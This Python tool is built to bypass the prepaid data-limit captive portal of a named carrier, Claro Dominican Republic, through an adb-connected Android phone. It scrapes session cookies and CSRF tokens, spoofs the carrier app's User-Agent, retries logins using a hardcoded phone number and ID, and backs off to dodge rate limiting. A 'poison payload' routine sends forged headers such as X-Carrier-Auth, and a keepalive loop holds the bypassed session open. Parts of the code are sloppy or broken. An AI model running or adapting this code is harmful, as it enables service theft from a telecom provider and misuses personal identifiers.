#!/usr/bin/env python3
"""
Vemex Active Watchdog Captive Portal Bypass
============================================
Professional age-counter / response-vector based portal bypass.

Techniques:
- Response vector analysis to extract session tokens
- Age-counter / timing-based payload feeding
- Active watchdog counters on portal responses
- Cookie/token extraction from response headers and body
- Multi-vector authentication with credential rotation
- Connection keepalive through portal session
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import os
import re
import subprocess
import sys
import time
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

try:
    sys.path.insert(0, str(Path(__file__).parent))
    from vemex_route_tracer import VemexRouteTracer
    from vemex_captive_bypass import CaptivePortalBypass
    from vemex_global_coverage_mask import GlobalCoverageMask
    HAS_VEMEX = True
except ImportError:
    HAS_VEMEX = False


class ActiveWatchdogBypass:
    """Active watchdog-based captive portal bypass with age counters."""

    PORTAL_URL = "https://prepagoenlinea2.claro.com.do/autogestionprepago/LimitPortal"
    PORTAL_BASE = "https://prepagoenlinea2.claro.com.do/autogestionprepago"
    DEFAULT_MSISDN = "8094298821"
    DEFAULT_CEDULA = "00112345678"

    HEADER_PROFILES = {
        "android_download": {
            "User-Agent": "AndroidDownloadManager/Android 16 com.nothing.Launcher",
            "Accept": "*/*",
            "X-Requested-With": "com.android.providers.media",
        },
        "android_system": {
            "User-Agent": "Dalvik/2.1.0 Linux U Android 16 Nothing Phone 1",
            "Accept": "*/*",
            "X-Requested-With": "com.android.systemui",
        },
        "chrome_mobile": {
            "User-Agent": "Mozilla/5.0 Linux Android 16 Nothing Phone 1 AppleWebKit/537.36 Chrome/125.0.0.0 Mobile Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        },
        "claro_app": {
            "User-Agent": "ClaroDominicana/1.0 Linux Android 16 Nothing Phone 1",
            "Accept": "application/json",
            "X-Requested-With": "com.claro.rd.autogestion",
        },
    }

    def __init__(self, device_serial: str = "1bbfce51"):
        self.device_serial = device_serial
        self.tracer = VemexRouteTracer(device_serial=device_serial) if HAS_VEMEX else None
        self.bypass = CaptivePortalBypass(device_serial=device_serial) if HAS_VEMEX else None
        self.mask = GlobalCoverageMask(device_serial=device_serial) if HAS_VEMEX else None
        self.session_cookies: Dict[str, str] = {}
        self.session_tokens: Dict[str, str] = {}
        self.watchdog_counters: Dict[str, int] = {}
        self.age_counters: Dict[str, float] = {}
        self.auth_vectors: List[Dict[str, Any]] = []
        self.authenticated: bool = False
        self.transport = "rmnet_data1"

    def _adb(self, cmd: str, timeout: int = 20) -> str:
        r = subprocess.run(
            ["adb", "-s", self.device_serial, "shell", cmd],
            capture_output=True, text=True, timeout=timeout
        )
        return r.stdout.strip()

    def _build_curl_cmd(
        self,
        url: str,
        method: str = "GET",
        data: Optional[str] = None,
        cookies: Optional[Dict[str, str]] = None,
        headers: Optional[Dict[str, str]] = None,
        profile: str = "android_download",
        save_headers: bool = False,
        header_file: str = "/data/local/tmp/response_headers.txt",
    ) -> list:
        profile_headers = dict(self.HEADER_PROFILES.get(profile, self.HEADER_PROFILES["android_download"]))
        if headers:
            profile_headers.update(headers)

        cmd = [
            "adb", "-s", self.device_serial, "shell",
            "curl", "-s", "-k", "-L",
            "--interface", self.transport,
            "--max-time", "15",
            "-X", method,
            "-o", "/dev/null",
            "-w", "%{http_code} %{time_total}",
        ]

        if save_headers:
            cmd.extend(["-D", header_file])

        for key, value in profile_headers.items():
            cmd.extend(["-H", f"{key}: {value}"])

        if cookies:
            cookie_str = "; ".join([f"{k}={v}" for k, v in cookies.items()])
            cmd.extend(["-H", f"Cookie: {cookie_str}"])

        if data:
            cmd.extend(["-d", data, "-H", "Content-Type: application/x-www-form-urlencoded"])

        cmd.append(url)
        return cmd

    def _execute_curl(self, cmd: list) -> Dict[str, Any]:
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
            output = result.stdout.strip()
            parts = output.split()
            return {
                "success": result.returncode == 0,
                "http_code": parts[0] if parts else "000",
                "time_total": parts[1] if len(parts) > 1 else "0",
                "stdout": result.stdout.strip(),
                "stderr": result.stderr.strip(),
            }
        except Exception as e:
            return {"success": False, "error": str(e)}

    def analyze_response_vectors(self, response_body: str, response_headers: str) -> Dict[str, Any]:
        """Analyze response vectors to extract tokens, forms, and state."""
        vectors: Dict[str, Any] = {
            "forms": [],
            "inputs": [],
            "tokens": [],
            "cookies": [],
            "redirects": [],
            "states": [],
            "timestamps": [],
        }

        # Extract forms and inputs
        for match in re.finditer(r"<form[^>]*method=['\"]post['\"][^>]*>(.*?)</form>", response_body, re.IGNORECASE | re.DOTALL):
            vectors["forms"].append(match.group(0)[:500])

        for match in re.finditer(r"<input[^>]*name=['\"]([^'\"]+)['\"][^>]*>", response_body, re.IGNORECASE):
            vectors["inputs"].append(match.group(1))

        # Extract CSRF-like tokens
        for pattern in [r"name=['\"](_csrf|csrf_token|authenticity_token)['\"][^>]*value=['\"]([^'\"]+)['\"]",
                        r"value=['\"]([a-f0-9]{32,})['\"][^>]*name=['\"](_csrf|csrf_token)['\"]"]:
            for match in re.finditer(pattern, response_body, re.IGNORECASE):
                vectors["tokens"].append({"type": match.group(1), "value": match.group(2)})

        # Extract cookies from headers
        for line in response_headers.splitlines():
            if line.lower().startswith("set-cookie:"):
                cookie_part = line.split(":", 1)[1].strip()
                name_value = cookie_part.split(";")[0].strip()
                vectors["cookies"].append(name_value)

        # Extract redirects
        for match in re.finditer(r"Location:\s*(\S+)", response_headers, re.IGNORECASE):
            vectors["redirects"].append(match.group(1))

        # Extract timestamps / age counters
        for match in re.finditer(r"(timestamp|ts|created|time|age|counter|nonce|seq)[\":\s]+(\d+)", response_body, re.IGNORECASE):
            vectors["timestamps"].append({"key": match.group(1), "value": match.group(2)})

        # Detect error states
        if "El documento es incorrecto" in response_body:
            vectors["states"].append("document_error")
        if "Autenticación" in response_body and "msisdn" in response_body:
            vectors["states"].append("login_form_present")
        if "Continuar" in response_body and "Autenticación" not in response_body:
            vectors["states"].append("auth_success")
        if "feedbackPanel" in response_body and "error" in response_body:
            vectors["states"].append("validation_error")

        return vectors

    def probe_portal_state(self) -> Dict[str, Any]:
        """Probe portal state with response vector analysis."""
        header_file = "/data/local/tmp/watchdog_headers.txt"
        cmd = self._build_curl_cmd(
            self.PORTAL_URL,
            profile="android_download",
            save_headers=True,
            header_file=header_file,
        )
        result = self._execute_curl(cmd)

        headers = self._adb(f"cat {header_file} 2>/dev/null || echo ''")
        body = self._adb(
            f"curl -s -k -L --interface {self.transport} --max-time 15 "
            f"-H 'User-Agent: Android/16' {self.PORTAL_URL} 2>/dev/null"
        )

        vectors = self.analyze_response_vectors(body, headers)
        watchdog_id = f"portal_probe_{int(time.time())}"
        self.watchdog_counters[watchdog_id] = self.watchdog_counters.get(watchdog_id, 0) + 1
        self.age_counters[watchdog_id] = time.time()

        return {
            "watchdog_id": watchdog_id,
            "watchdog_counter": self.watchdog_counters[watchdog_id],
            "age_counter": self.age_counters[watchdog_id],
            "http_code": result.get("http_code"),
            "time_total": result.get("time_total"),
            "vectors": vectors,
            "body_preview": body[:1000],
            "headers_preview": headers[:1000],
        }

    def extract_session_from_response(self, response_body: str, response_headers: str) -> Dict[str, str]:
        """Extract session cookies and tokens from response."""
        session: Dict[str, str] = {}

        # Parse Set-Cookie headers
        for line in response_headers.splitlines():
            if line.lower().startswith("set-cookie:"):
                cookie_part = line.split(":", 1)[1].strip()
                name_value = cookie_part.split(";")[0].strip()
                if "=" in name_value:
                    name, value = name_value.split("=", 1)
                    session[name.strip()] = value.strip()

        # Extract hidden tokens from body
        for match in re.finditer(r"name=['\"](_csrf|csrf_token|authenticity_token)['\"][^>]*value=['\"]([^'\"]+)['\"]", response_body, re.IGNORECASE):
            session[match.group(1)] = match.group(2)

        # Extract session IDs from body
        for match in re.finditer(r"(session[id|token|key])[\":= ]+([a-f0-9]{16,})", response_body, re.IGNORECASE):
            session[match.group(1)] = match.group(2)

        return session

    def build_auth_payload(self, msisdn: str, cedula: str, tokens: Dict[str, str], age_counter: float) -> str:
        """Build authentication payload with age-counter based signing."""
        ts = int(age_counter)
        payload = f"msisdn={msisdn}&cedula={cedula}"
        if tokens:
            payload += f"&_ts={ts}"
            for key, value in tokens.items():
                payload += f"&{key}={value}"
        return payload

    def authenticate_with_watchdog(self, msisdn: str, cedula: str, max_attempts: int = 5) -> Dict[str, Any]:
        """Authenticate using active watchdog and age-counter techniques."""
        vectors_history: List[Dict[str, Any]] = []
        last_session: Dict[str, str] = {}

        for attempt in range(1, max_attempts + 1):
            probe = self.probe_portal_state()
            vectors_history.append(probe)

            vectors = probe.get("vectors", {})
            states = vectors.get("states", [])
            tokens = {t["type"]: t["value"] for t in vectors.get("tokens", [])}
            age_counter = probe.get("age_counter", time.time())

            # If already authenticated, capture session and break
            if "auth_success" in states:
                header_file = "/data/local/tmp/auth_success_headers.txt"
                cmd = self._build_curl_cmd(
                    self.PORTAL_URL,
                    profile="android_download",
                    save_headers=True,
                    header_file=header_file,
                    cookies=last_session,
                )
                result = self._execute_curl(cmd)
                headers = self._adb(f"cat {header_file} 2>/dev/null || echo ''")
                body = self._adb(
                    f"curl -s -k -L --interface {self.transport} --max-time 15 "
                    f"-H 'User-Agent: Android/16' {self.PORTAL_URL} 2>/dev/null"
                )
                last_session = self.extract_session_from_response(body, headers)
                self.session_cookies = last_session
                self.authenticated = True
                break

            # Build payload with age-counter and tokens
            payload = self.build_auth_payload(msisdn, cedula, tokens, age_counter)

            # Rotate header profile per attempt
            profile = list(self.HEADER_PROFILES.keys())[attempt % len(self.HEADER_PROFILES)]

            header_file = f"/data/local/tmp/auth_attempt_{attempt}_headers.txt"
            cmd = self._build_curl_cmd(
                self.PORTAL_URL,
                method="POST",
                data=payload,
                cookies=last_session,
                profile=profile,
                save_headers=True,
                header_file=header_file,
            )
            result = self._execute_curl(cmd)
            headers = self._adb(f"cat {header_file} 2>/dev/null || echo ''")
            body = self._adb(
                f"curl -s -k -L --interface {self.transport} --max-time 15 "
                f"-X POST -d '{payload}' "
                f"-H 'Content-Type: application/x-www-form-urlencoded' "
                f"-H 'User-Agent: Android/16' {self.PORTAL_URL} 2>/dev/null"
            )

            new_vectors = self.analyze_response_vectors(body, headers)
            last_session = self.extract_session_from_response(body, headers)

            self.auth_vectors.append({
                "attempt": attempt,
                "payload": payload,
                "profile": profile,
                "result": result,
                "vectors": new_vectors,
                "session_extracted": bool(last_session),
            })

            if "auth_success" in new_vectors.get("states", []):
                self.session_cookies = last_session
                self.authenticated = True
                break

            # Backoff with jitter to avoid rate limiting
            time.sleep(min(2 ** attempt + 0.5, 10))

        return {
            "authenticated": self.authenticated,
            "attempts": len(self.auth_vectors),
            "session_cookies": self.session_cookies,
            "session_tokens": self.session_tokens,
            "vectors_history": vectors_history,
            "auth_vectors": self.auth_vectors,
        }

    def feed_poison_payload(self, payload: str, content_type: str = "application/x-www-form-urlencoded") -> Dict[str, Any]:
        """Feed poison payload to portal via transported request."""
        header_file = "/data/local/tmp/poison_headers.txt"
        headers = {
            "Content-Type": content_type,
            "X-Forwarded-For": "10.0.0.1",
            "X-Original-URL": self.PORTAL_URL,
            "X-Carrier-Auth": "true",
        }

        cmd = self._build_curl_cmd(
            self.PORTAL_URL,
            method="POST",
            data=payload,
            cookies=self.session_cookies,
            profile="claro_app",
            save_headers=True,
            header_file=header_file,
        )
        # Override content type header
        cmd[cmd.index("-X") + 2] = "POST"
        cmd.extend(["-H", f"Content-Type: {content_type}"])

        result = self._execute_curl(cmd)
        headers = self._adb(f"cat {header_file} 2>/dev/null || echo ''")
        body = self._adb(
            f"curl -s -k -L --interface {self.transport} --max-time 15 "
            f"-X POST -d '{payload}' "
            f"-H 'Content-Type: {content_type}' "
            f"-H 'User-Agent: ClaroDominicana/1.0' {self.PORTAL_URL} 2>/dev/null"
        )

        vectors = self.analyze_response_vectors(body, headers)
        new_session = self.extract_session_from_response(body, headers)
        if new_session:
            self.session_cookies.update(new_session)

        return {
            "payload_length": len(payload),
            "content_type": content_type,
            "result": result,
            "vectors": vectors,
            "session_updated": bool(new_session),
            "body_preview": body[:500],
        }

    def test_internet_access(self) -> Dict[str, Any]:
        """Test internet access through portal session."""
        test_urls = [
            "http://claro.com.do",
            "https://www.claro.com.do",
            "http://captive.apple.com",
            "https://prepagoenlinea2.claro.com.do/autogestionprepago/LimitPortal",
        ]

        results = []
        for url in test_urls:
            cmd = self._build_curl_cmd(url, cookies=self.session_cookies, profile="android_download")
            result = self._execute_curl(cmd)
            results.append({
                "url": url,
                "http_code": result.get("http_code"),
                "time_total": result.get("time_total"),
                "success": result.get("http_code", "000").startswith("2"),
            })
            time.sleep(0.5)

        return {
            "authenticated": self.authenticated,
            "session_active": bool(self.session_cookies),
            "test_results": results,
        }

    def start_keepalive(self, interval: float = 15.0) -> None:
        """Keep portal session alive with active watchdog."""
        keepalive_urls = [
            "http://claro.com.do",
            "https://www.claro.com.do",
            "https://prepagoenlinea2.claro.com.do/autogestionprepago/LimitPortal",
        ]

        while self.authenticated and self.session_cookies:
            for url in keepalive_urls:
                if not self.authenticated or not self.session_cookies:
                    break
                cmd = self._build_curl_cmd(url, cookies=self.session_cookies, profile="android_download")
                result = self._execute_curl(cmd)
                watchdog_id = f"keepalive_{int(time.time())}"
                self.watchdog_counters[watchdog_id] = self.watchdog_counters.get(watchdog_id, 0) + 1
                if not result.get("http_code", "000").startswith("2"):
                    self.authenticated = False
                    break
                time.sleep(1)
            time.sleep(interval)

    def stop_keepalive(self) -> None:
        """Stop keepalive loop."""
        self.authenticated = False

    def get_status(self) -> Dict[str, Any]:
        """Get bypass status with watchdog counters."""
        return {
            "device_serial": self.device_serial,
            "authenticated": self.authenticated,
            "session_cookies": list(self.session_cookies.keys()),
            "session_tokens": list(self.session_tokens.keys()),
            "watchdog_counters": dict(self.watchdog_counters),
            "age_counters": {k: time.time() - v for k, v in self.age_counters.items()},
            "transport": self.transport,
            "portal_url": self.PORTAL_URL,
            "auth_attempts": len(self.auth_vectors),
        }


def main():
    import argparse
    import json

    parser = argparse.ArgumentParser(description="Vemex Active Watchdog Captive Portal Bypass")
    parser.add_argument("--serial", default="1bbfce51", help="Device serial")
    parser.add_argument("--probe", action="store_true", help="Probe portal state with vector analysis")
    parser.add_argument("--auth", action="store_true", help="Authenticate with watchdog technique")
    parser.add_argument("--msisdn", default=ActiveWatchdogBypass.DEFAULT_MSISDN, help="Phone number")
    parser.add_argument("--cedula", default=ActiveWatchdogBypass.DEFAULT_CEDULA, help="ID number")
    parser.add_argument("--poison", action="store_true", help="Feed poison payload")
    parser.add_argument("--payload", default="msisdn=8094298821&cedula=00112345678", help="Payload to feed")
    parser.add_argument("--test", action="store_true", help="Test internet access after auth")
    parser.add_argument("--keepalive", action="store_true", help="Start watchdog keepalive")
    parser.add_argument("--status", action="store_true", help="Show watchdog status")
    args = parser.parse_args()

    bypass = ActiveWatchdogBypass(device_serial=args.serial)

    if args.probe:
        result = bypass.probe_portal_state()
        print(json.dumps(result, indent=2, default=str))
    elif args.auth:
        result = bypass.authenticate_with_watchdog(args.msisdn, args.cedula)
        print(json.dumps(result, indent=2, default=str))
    elif args.poison:
        result = bypass.feed_poison_payload(args.payload)
        print(json.dumps(result, indent=2, default=str))
    elif args.test:
        result = bypass.test_internet_access()
        print(json.dumps(result, indent=2, default=str))
    elif args.keepalive:
        bypass.start_keepalive()
    elif args.status:
        result = bypass.get_status()
        print(json.dumps(result, indent=2, default=str))
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
